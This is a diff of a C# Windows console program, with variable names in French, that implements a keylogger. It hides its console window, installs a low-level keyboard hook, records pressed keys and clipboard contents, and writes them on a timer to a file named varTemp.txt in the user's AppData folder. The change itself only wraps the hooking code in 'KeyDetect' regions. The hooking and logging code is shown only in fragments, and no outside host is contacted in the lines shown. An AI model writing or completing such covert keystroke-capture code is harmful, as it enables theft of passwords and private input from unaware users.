@@ -10,6 +10,7 @@ namespace Win32AppAF
 {
     class Program
     {
+        #region KeyDetect
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
 
@@ -23,6 +24,7 @@ namespace Win32AppAF
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
+        #endregion
 
         private static string TouchesAppuiee = string.Empty;
         private static string pressePapier = string.Empty;
@@ -30,6 +32,7 @@ namespace Win32AppAF
         public static string cheminDossier = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         public static string cheminFichier = cheminDossier + @"\varTemp.txt";
 
+        #region KeyDetect
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
@@ -46,6 +49,8 @@ namespace Win32AppAF
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
         [STAThread]
+        #endregion
+
         static void Main(string[] args)
         {
             var handle = GetConsoleWindow();
@@ -65,12 +70,14 @@ namespace Win32AppAF
 
             delaiSave.Enabled = true;
 
+            #region KeyDetect
             Application.EnableVisualStyles();
             _hookID = SetHook(_proc);
 
             Application.Run();
             
             UnhookWindowsHookEx(_hookID);
+            #endregion
         }
 
         static void delaiSave_Tick(object sender, EventArgs e)
